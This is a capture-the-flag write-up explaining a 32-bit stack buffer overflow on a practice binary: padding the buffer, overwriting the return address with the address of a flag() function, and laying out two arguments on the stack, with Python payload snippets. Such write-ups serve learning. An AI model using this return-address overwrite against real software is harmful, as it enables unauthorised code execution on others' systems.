- - - -
### Problem:
Now try overwriting arguments. Can you get the flag from this program? You can find it in /problems/overflow-2_6_97cea5256ff7afcd9c8ede43d264f46e on the shell server. Source.

- - - -
### Goal:
Buffer overflow to get to the `flag()` function. Pass the correct arguments to the function to get the CTF flag.

- - - -
### Solution:
Similar to previous overflows, we will overflow the buffer and overwrite the return address to the address of the flag function. We found the address of the flag function by running `nm vuln` and this results in the following exploit so far:

```python
cmd = b'A' * 176        # buffer
cmd += b'B' * 4         # var -> .rodata:aFlagFileIsMiss+44
cmd += b'C' * 4         # var -> .got.plt:_GLOBAL_OFFSET_TABLE_
cmd += b'D' * 4         # var -> [stack]:FFF4D618
cmd += p32(0x080485e6)  # overwrite return
```

Now we need to pass arguments to the flag function. Observe the x86 calling convention shown below:
![x86 Calling Convention](https://www.cs.virginia.edu/~evans/cs216/guides/stack-convention.png)

Once we are inside the `flag()` function we obtain the 1st argument by doing `ebp + 8` and the 2nd argument by doing `ebp + 12`.

So naturally the next question is ... where will `ebp` be when we are in the `flag()` function. In short, based on the prologue of a new function call, `ebp` will point to the beginning of the overwriten return in our exploit.

Therefore, we need to add an extra four bytes after the overwritten return address before the first argument.

```python
cmd = b'A' * 176        # buffer
cmd += b'B' * 4         # var -> .rodata:aFlagFileIsMiss+44
cmd += b'C' * 4         # var -> .got.plt:_GLOBAL_OFFSET_TABLE_
cmd += b'D' * 4         # var -> [stack]:FFF4D618
cmd += p32(0x080485e6)  # overwrite return
cmd += b'E' * 4
cmd += p32(0xDEADBEEF)  # arg1
cmd += p32(0xC0DED00D)  # arg2
```
